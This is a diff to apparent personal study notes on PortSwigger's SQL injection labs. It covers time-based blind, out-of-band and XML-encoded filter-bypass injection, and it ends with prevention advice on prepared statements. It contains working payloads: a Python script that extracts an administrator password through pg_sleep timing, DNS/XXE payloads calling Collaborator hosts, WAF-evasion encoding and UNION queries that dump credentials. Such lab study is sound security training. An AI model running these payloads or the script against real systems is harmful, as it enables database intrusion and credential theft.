@@ -1748,18 +1748,447 @@ The database contains a different table `users`, with columns called `username` 
 
 > Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![Access lab 0.12 - Blind Time-Based SQL Injection](images/lab-0.12-blind-time-delays/access-lab-0.12.png)
+
+![Send the request to Repeater to test the TrackingId cookie 0.12](images/lab-0.12-blind-time-delays/capture-request-repeater-0.12.png)
+
+![Inject pg_sleep(10) and observe the 10-second response delay 0.12](images/lab-0.12-blind-time-delays/test-pg-sleep-time-delay-0.12.png)
+
+![Test FALSE condition (1=2) and observe the normal response time 0.12](images/lab-0.12-blind-time-delays/test-false-condition-0.12.png)
+
+![Test TRUE condition (1=1) and observe the 10-second response delay 0.12](images/lab-0.12-blind-time-delays/test-true-condition-0.12.png)
+
+![Verify the users table using a conditional time delay 0.12](images/lab-0.12-blind-time-delays/identify-users-table-0.12.png)
+
+![Test the zeroday username and observe no time delay because the user does not exist 0.12](images/lab-0.12-blind-time-delays/verify-zeroday-username-0.12.png)
+
+![Test the administrator username and confirm the time delay because the user exists 0.12](images/lab-0.12-blind-time-delays/verify-administrator-username-0.12.png)
+
+![Test password length 1 and observe the normal response time 0.12](images/lab-0.12-blind-time-delays/test-password-length-1-0.12.png)
+
+![Test password length 10 and observe the normal response time 0.12](images/lab-0.12-blind-time-delays/test-password-length-10-0.12.png)
+
+![Confirm password length 20 through the 10-second response delay 0.12](images/lab-0.12-blind-time-delays/confirm-password-length-20-0.12.png)
+
+![Test the first password character using SUBSTRING() and conditional time delays 0.12](images/lab-0.12-blind-time-delays/test-password-character-0.12.png)
+
+![Run Python automation and extract the administrator password character by character using time-based detection 0.12](images/lab-0.12-blind-time-delays/extract-password-python-0.12.png)
+
+![Open the administrator login page after password extraction 0.12](images/lab-0.12-blind-time-delays/administrator-login-page-0.12.png)
+
+![Successfully authenticate as administrator and complete the lab 0.12](images/lab-0.12-blind-time-delays/lab-completed-0.12.png)
+
+##### Tutorial
+
+1. Open the `/` page, capture the request in HTTP history, and send it to Repeater.
+2. Test the `TrackingId` cookie parameter with `pg_sleep()`:
+```sql
+'|| (SELECT pg_sleep(10))||'
+```
+The response takes approximately 10 seconds (e.g., 10.191 seconds), indicating a potential time-based SQL injection vulnerability.
+
+3. Test conditional statements (TRUE/FALSE) to understand the response behavior and identify the database structure.
+
+```sql
+'||CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
+# False: normal response (~184 ms)
+
+'||CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
+# True: delayed response (~20.183 seconds)
+
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)-- 
+# Verify the users table exists.
+
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='zeroday')-- 
+# Check whether the zeroday username exists.
+
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
+# Verify the administrator username exists.
+
+'||(SELECT CASE WHEN LENGTH(password) = 1 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
+# Test whether the password length is 1.
+
+'||(SELECT CASE WHEN LENGTH(password) = 10 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
+# Test whether the password length is 10.
+
+'||(SELECT CASE WHEN LENGTH(password) = 20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
+# Test whether the password length is 20. A delayed response indicates a match.
+
+'||(SELECT CASE WHEN SUBSTRING(password, 1, 1) = '0' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- 
+# Test whether the first password character is '0'.
+```
+4. Automate password extraction using a Python script:
+
+```python
+import requests
+import string
+import time
+
+# Target and session
+url = "https://0a7800c3041616da80c6216900aa0033.web-security-academy.net/"
+tracking_id = "UUHgnp4idxP5HXuZ"
+session = "lxguDCkoOTdbg9IixxExVJvwgCUFEWhH"
+
+# Extraction settings
+delay = 10
+threshold = 9.5
+max_length = 50
+
+chars = string.ascii_lowercase + string.digits
+
+http = requests.Session()
+http.headers["User-Agent"] = "Mozilla/5.0"
+
+password = ""
+
+print("[*] Time-Based Blind SQLi")
+print("[*] Extracting administrator password...\n")
+
+# Extract password character by character
+for pos in range(1, max_length + 1):
+    for char in chars:
+
+        # Test password character using pg_sleep()
+        cookies = {
+            "TrackingId": (
+                f"{tracking_id}'||(SELECT CASE WHEN "
+                f"SUBSTRING(password,{pos},1)='{char}' "
+                f"THEN pg_sleep({delay}) ELSE pg_sleep(0) END "
+                "FROM users WHERE username='administrator')--"
+            ),
+            "session": session
+        }
+
+        try:
+            start = time.perf_counter()
+            http.get(url, cookies=cookies, timeout=delay + 10)
+            elapsed = time.perf_counter() - start
+
+            if elapsed >= threshold:
+                password += char
+                print(
+                    f"[+] {pos:02}: {char} | "
+                    f"{elapsed:.2f} seconds"
+                )
+                break
+
+        except requests.RequestException:
+            continue
+    else:
+        print(f"\n[!] Extraction stopped at position {pos}.")
+        break
+
+print(f"\n[+] Password: {password}")
+```
+5. Run the script and wait for the extraction process to finish.
+6. Check the terminal output to obtain the extracted password.
+7. Open the login page and enter the `administrator` username with the extracted password.
+8. Successfully log in as the administrator and complete the lab.
+
+##### Reference
+
+<details>
+<summary>30. SQL Injection - Lab #18 Visible error-based SQL injection | Short Version — Intigriti</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=xHzH00vyVHA
+Purpose: In this video, we are going to have a look at how to retrieve data from a PostgreSQL database by monitoring DB sleeps using the pg_sleep() function. 
+</details>
+
+<details>
+<summary>31. SQL Injection - Lab #14 Blind SQL injection with time delays and information retrieval — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=L2e6wrNj4BA
+Purpose: In this video, we cover Lab #14 in the SQL injection track of the Web Security Academy. This lab contains a blind SQL injection vulnerability. To solve the lab, we exploit the time-based SQL injection vulnerability and output the password of the administrator user.
+</details>
+
+<details>
+<summary>32. Blind SQL injection with time delays and information retrieval  — Michael Sommer</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=ogljCf4oR3E
+Purpose: Blind SQL injection with time delays and information retrieval
+</details>
+
+</details>
+
 #### Exploiting blind SQL injection using out-of-band (OAST) techniques
 
+An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread. The query is still vulnerable to SQL Injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occuring , or on the time taken to excute the query.
+
+ In this situation, it is often possible to exploit the blind SQL Injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggred based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+ A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
+
 #### Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued
+
+The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator.
+
+The techniques for triggering a DNS query are specific to type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+
+```sql
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+This causes the database to perform a lookup for the following domain:
+```sql
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.
+
 ##### Lab: Blind SQL injection with out-of-band interaction
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.13</summary>
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+> Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+
+> You can find some useful payloads on our SQL injection cheat sheet[https://portswigger.net/web-security/sql-injection/cheat-sheet].
+
+
+##### Tutorial
+
+1. Soon i try solve, why? because i need Burp Professional to try Burp collaborator feature.
+2. To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+
+```sql
+TrackingId=KyKt0Ao9NASbbhfa'|| SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://5rxfp0q79vqepdtouy5s69ciz950trhg.oastify.com"> %remote;]>'),'/l') FROM dual)--
+```
+
+##### Reference
+
+<details>
+<summary>33. SQL Injection - Lab #15 Blind SQL injection with out-of-band interaction — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=-t4cr5uRzzA
+Purpose: This lab contains a blind SQL injection vulnerability. To solve the lab, we exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+</details>
+
+<details>
+<summary>34. Blind SQL injection with out-of-band interaction — Michael Sommer</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=dP4fGg11whc
+Purpose: Blind SQL injection with out-of-band interaction
+</details>
+
+</details>
+
 ##### Lab: Blind SQL injection with out-of-band data exfiltration
+
+This lab contains a blind SQL Injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.14</summary>
+
+The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL Injection vulnerability to find out the password of the `administrator` user.
+
+To solve the lab, log in as the `administrator` user.
+
+> Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+
+##### Reference
+
+<details>
+<summary>35. SQL Injection - Lab #16 Blind SQL injection with out of band data exfiltration — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=KOaDan0UqFs
+Purpose: This lab contains a blind SQL injection vulnerability. To solve the lab, we exploit the out-of-band SQL injection vulnerability to output the administrator password.
+</details>
+
+<details>
+<summary>36. Blind SQL injection with out-of-band data exfiltration — Michael Sommer</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=-ReGzKgrOd4
+Purpose: This video shows the lab solution of "Blind SQL injection with out-of-band data exfiltration" from Web Security Academy (Portswigger)
+</details>
+
+</details>
 
 ## SQL injection in different contexts
 
+In the previous labs, you need the query string to inject your malicious SQL payload. However, you can perform SQL Injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+
+These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense machanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords For Example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`.
+
+```xml
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+This will be decoded server-side before being passed to the SQL interpreter.
+
 #### Lab: SQL injection with filter bypass via XML encoding
+
+This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.15</summary>
+
+The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their this account.
+
+>Note: A web application firewall (WAF) will block request that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvektor extension to do this.
+
+![Open Lab 0.15](images/lab-0.15-xml-filter-bypass/open-lab-0.15.png)
+
+![Capture XML Request and Send to Repeater 0.15](images/lab-0.15-xml-filter-bypass/capture-xml-request-repeater-0.15.png)
+
+![SQL Injection Blocked by WAF - Attack Detected 0.15](images/lab-0.15-xml-filter-bypass/sql-injection-waf-blocked-0.15.png)
+
+![Convert Payload Using Hex Entities 0.15](images/lab-0.15-xml-filter-bypass/hex-entities-encoding-0.15.png)
+
+![Test Time-Based SQL Injection 0.15](images/lab-0.15-xml-filter-bypass/time-based-sqli-test-0.15.png)
+
+![Determine Column Count Using ORDER BY 1 - 0.15](images/lab-0.15-xml-filter-bypass/order-by-1-column-test-0.15.png)
+
+![ORDER BY 2 Causes Column Error 0.15](images/lab-0.15-xml-filter-bypass/order-by-2-column-error-0.15.png)
+
+![Test UNION SELECT NULL 0.15](images/lab-0.15-xml-filter-bypass/union-select-null-test-0.15.png)
+
+![Enumerate Table Names Using Information Schema 0.15](images/lab-0.15-xml-filter-bypass/information-schema-table-enumeration-0.15.png)
+
+![Find Users Table Using Information Schema 0.15](images/lab-0.15-xml-filter-bypass/users-table-discovery-0.15.png)
+
+![Enumerate Users Table Columns - Email Username Password 0.15](images/lab-0.15-xml-filter-bypass/users-table-column-enumeration-0.15.png)
+
+![Retrieve Usernames and Passwords 0.15](images/lab-0.15-xml-filter-bypass/extract-usernames-passwords-0.15.png)
+
+![Login as Administrator 0.15](images/lab-0.15-xml-filter-bypass/administrator-login-0.15.png)
+
+![Successfully Solved the Lab 0.15](images/lab-0.15-xml-filter-bypass/lab-solved-0.15.png)
+
+#### Tutorial
+
+
+##### Tutorial
+
+1. Capture HTTP Request — Find the HTTP request containing the XML parameter `<productId>` and send it to Repeater.
+2. Install Hackvertor — Install the Hackvertor extension from Burp Suite BApp Store. Use the `hex_entities` tag to encode SQL injection payloads into hexadecimal XML entities.
+3. Determine the Number of Columns — Test the number of columns using `ORDER BY`.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId><@hex_entities>1 ORDER BY 1--</@hex_entities></productId>
+  <storeId>2</storeId>
+</stockCheck>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId><@hex_entities>1 ORDER BY 2--</@hex_entities></productId>
+  <storeId>2</storeId>
+</stockCheck>
+```
+
+`ORDER BY 1` succeeds, while `ORDER BY 2` fails, indicating that the query returns one column.
+
+4. Enumerate Database Tables
+
+```sql
+1 UNION SELECT table_name FROM information_schema.tables--
+```
+
+Find the `users` table in the results.
+
+5. Enumerate Table Columns
+
+```sql
+1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
+```
+
+The `users` table contains:
+- `email`
+- `password`
+- `username`
+
+6. Extract User Credentials
+
+```sql
+1 UNION SELECT username || '~' || password FROM users--
+```
+
+The response reveals usernames and passwords, including the administrator credentials.
+
+7. Log In — Use the extracted administrator username and password to log in to the application.
+8. Complete the Lab — Successfully log in as the administrator to solve the lab.
+
+
+##### Reference
+
+<details>
+<summary>37. SQL Injection - Lab #17 SQL injection with filter bypass via XML encoding — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=ELdyZm0nK4g
+Purpose: This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+</details>
+
+<details>
+<summary>38. SQL injection with Filter Bypass via XML Encoding — Michael Sommer</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=2iqMm0gMyHk
+Purpose: Learn about SQL Injection vulnerabilities. In this video, we are going to have a look at how to exploit an SQLi vulnerability, bypassing WAF filters via XML encoding. We'll also explore SQLMap tamper scripts and [attempt] to debug encoding issues.
+</details>
+
+</details>
 
 ## Second-order SQL injection
 
+First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in a unsafe way.
+
+Second-order SQL injection occurs when the application takes user input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL Injection.
+
+Second-order SQL Injection often in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemend to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.
+
 ## How to prevent SQL injection
 
+You cant prevent instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also known as "prepared statements".
+
+The following code is vulnerable to SQL injection because the user input is concatenated directly into query:
+
+```sql
+String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+```
+You can rewrite this code in a way prevents the user input from interfering with the query structure:
+
+```SQL
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+```
+
 ### How to prevent SQL injection - Continued
+
+You can use parameterized queries for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause. Application fuctionality that places untrusted data into these parts of the query needs to take a different approach, such as:
+
+- Whitelisting permitted input values.
+- Using different logic to deliver the required behaviour.
+
+For a parameterized query be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant. It must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It's easy to make mistakes about the possible origin of data, or for changes in other code to taint trusted data.
+
+## Well done! You've completed SQL injection.
+
+**SQL Injection (SQLi)**
+
+This learning path introduces SQL Injection (SQLi), one of the most critical web security vulnerabilities. You have learned how to detect and exploit SQL Injection to uncover hidden data, manipulate application behavior, and understand essential techniques for securing applications against SQLi attacks.
+
+[PortSwigger – SQL Injection Learning Path](https://portswigger.net/web-security/learning-paths/sql-injection)
+
+**Status:** Completed ✓
